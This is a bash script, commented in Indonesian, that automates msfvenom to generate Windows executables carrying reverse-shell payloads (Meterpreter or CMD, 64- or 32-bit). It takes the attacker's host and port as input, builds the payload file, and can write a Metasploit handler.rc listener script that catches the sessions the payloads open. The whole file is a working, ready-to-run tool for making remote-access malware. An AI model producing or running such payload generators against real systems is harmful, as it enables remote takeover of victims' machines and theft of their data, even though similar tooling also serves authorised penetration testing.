#!/bin/bash

# Warna untuk tampilan terminal
GREEN='\033[0;32m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

# Deteksi IP Lokal secara otomatis (mengambil interface aktif utama)
DEFAULT_LHOST=$(ip route get 1.1.1.1 2>/dev/null | grep -oP 'src \K\S+')

echo -e "${CYAN}===========================================${NC}"
echo -e "${CYAN}    AUTOMATED MSFVENOM WINDOWS PAYLOAD     ${NC}"
echo -e "${CYAN}===========================================${NC}"

# Input LHOST (Default: IP Lokal terdeteksi)
read -p "Masukkan LHOST [$DEFAULT_LHOST]: " LHOST
LHOST=${LHOST:-$DEFAULT_LHOST}

# Input LPORT (Default: 4444)
read -p "Masukkan LPORT [4444]: " LPORT
LPORT=${LPORT:-4444}

# Input Nama File Output (Default: payload.exe)
read -p "Masukkan nama file output [payload.exe]: " OUTPUT
OUTPUT=${OUTPUT:-payload.exe}

# Pilihan Jenis Payload
echo -e "\nPilih Payload:"
echo "1) windows/x64/meterpreter/reverse_tcp (64-bit Meterpreter - Recommended)"
echo "2) windows/meterpreter/reverse_tcp     (32-bit Meterpreter)"
echo "3) windows/x64/shell_reverse_tcp       (64-bit CMD Shell)"
echo "4) windows/shell_reverse_tcp           (32-bit CMD Shell)"
read -p "Pilihan [1-4, Default: 1]: " PAYLOAD_CHOICE

case $PAYLOAD_CHOICE in
    2) PAYLOAD="windows/meterpreter/reverse_tcp" ;;
    3) PAYLOAD="windows/x64/shell_reverse_tcp" ;;
    4) PAYLOAD="windows/shell_reverse_tcp" ;;
    *) PAYLOAD="windows/x64/meterpreter/reverse_tcp" ;;
esac

echo -e "\n${CYAN}[*] Membuat payload dengan konfigurasi:${NC}"
echo -e "    Payload : $PAYLOAD"
echo -e "    LHOST   : $LHOST"
echo -e "    LPORT   : $LPORT"
echo -e "    Output  : $OUTPUT\n"

# Eksekusi msfvenom
msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f exe -o "$OUTPUT"

if [ $? -eq 0 ]; then
    echo -e "\n${GREEN}[+] Payload berhasil dibuat: $(pwd)/$OUTPUT${NC}"
    
    # Opsi otomatis buat resource script handler msfconsole
    read -p "Buat file listener otomatis (handler.rc)? [y/N]: " BUILD_RC
    if [[ "$BUILD_RC" =~ ^[Yy]$ ]]; then
        cat <<EOF > handler.rc
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
EOF
        echo -e "${GREEN}[+] Resource file dibuat: handler.rc${NC}"
        echo -e "${CYAN}[*] Jalankan listener dengan: msfconsole -r handler.rc${NC}"
    fi
else
    echo -e "\n${RED}[!] Gagal membuat payload. Pastikan msfvenom sudah terinstall.${NC}"
fi
